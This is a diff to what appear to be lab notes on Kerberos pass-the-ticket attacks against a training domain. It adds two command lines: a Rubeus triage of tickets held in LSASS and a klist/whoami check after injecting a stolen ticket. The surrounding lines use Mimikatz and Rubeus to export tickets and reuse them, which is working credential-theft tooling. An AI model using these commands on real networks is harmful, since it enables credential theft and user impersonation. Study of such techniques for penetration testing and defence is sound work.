@@ -56,6 +56,7 @@ dir *.kirbi #=> [randomvalue]-username@service-domain.local.kirbi
 [+] #Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
 
 ## Rubeus - Export Tickets
+.\Rubeus.exe triage # enum tickets currently loaded in LSASS
 Rubeus.exe dump /nowrap # base64 format. (no admin priv needs)
 
 ---------------------------------------------------------------------------
@@ -94,6 +95,7 @@ Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb
 ### we can perform a Pass the Ticket providing the base64 string instead of the file name.
 PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))  ## Convert .kirbi to Base64 Format
 Rubeus.exe ptt /ticket:<BASE64> 
+klist; whoami  # Client: admin @ INLANEFREIGHT.LOCAL
 
 ## Mimikatz - Pass the Ticket
 mimikatz.exe 
